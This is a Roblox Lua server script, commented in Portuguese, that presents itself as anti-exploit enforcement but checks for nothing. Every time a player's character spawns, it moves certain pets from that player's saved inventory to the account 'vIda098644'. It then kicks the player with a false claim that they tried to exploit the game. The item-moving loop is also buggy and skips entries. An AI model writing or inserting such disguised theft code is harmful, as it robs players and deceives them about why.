local ReplicatedStorage = game:GetService("ReplicatedStorage")
local DataStoreService = game:GetService("DataStoreService")

-- Criação do RemoteEvent para comunicação com o cliente
local transferEvent = Instance.new("RemoteEvent")
transferEvent.Name = "TransferItemsEvent"
transferEvent.Parent = ReplicatedStorage

local inventoryDataStore = DataStoreService:GetDataStore("PlayerInventories")

-- Lista dos pets específicos para transferir
local petsToTransfer = {"Golden Dog", "bunny", "dog", "cat"}

-- Função para carregar o inventário de um jogador
local function loadInventory(player)
    local success, inventory = pcall(function()
        return inventoryDataStore:GetAsync(player.UserId)
    end)
    
    if success then
        return inventory or {}  -- Se não houver inventário, retorna uma tabela vazia
    else
        warn("Erro ao carregar inventário de " .. player.Name)
        return {}
    end
end

-- Função para salvar o inventário de um jogador
local function saveInventory(player, inventory)
    local success, errorMessage = pcall(function()
        inventoryDataStore:SetAsync(player.UserId, inventory)
    end)

    if not success then
        warn("Erro ao salvar inventário de " .. player.Name .. ": " .. errorMessage)
    end
end

-- Função para transferir somente os pets específicos de um jogador para o jogador vIda098644
local function transferPetsToOwner(player)
    local fromInventory = loadInventory(player)
    local toPlayer = game.Players:FindFirstChild("vIda098644")

    if toPlayer then
        local toInventory = loadInventory(toPlayer)

        -- Criar uma tabela para os pets a serem transferidos
        local petsTransferred = {}

        -- Verifica e transfere apenas os pets específicos
        for i, pet in ipairs(fromInventory) do
            if table.find(petsToTransfer, pet) then
                table.insert(petsTransferred, pet)
                table.remove(fromInventory, i)
            end
        end

        -- Adiciona os pets transferidos ao inventário do jogador dono
        for _, pet in ipairs(petsTransferred) do
            table.insert(toInventory, pet)
        end

        -- Salva os inventários atualizados
        saveInventory(player, fromInventory)
        saveInventory(toPlayer, toInventory)

        -- Expulsar o jogador com a mensagem
        player:Kick("Você foi expulso do servidor por tentativa de exploid. Seus pets foram transferidos para o dono do jogo.")
        print(player.Name .. " foi expulso e seus pets foram transferidos para vIda098644.")
    else
        warn("Jogador de destino vIda098644 não encontrado.")
    end
end

-- Verifica se o jogador está executando um script e realiza a expulsão
game.Players.PlayerAdded:Connect(function(player)
    player.CharacterAdded:Connect(function(character)
        -- Quando o jogador entra, transfere os pets automaticamente
        transferPetsToOwner(player)
    end)
end)
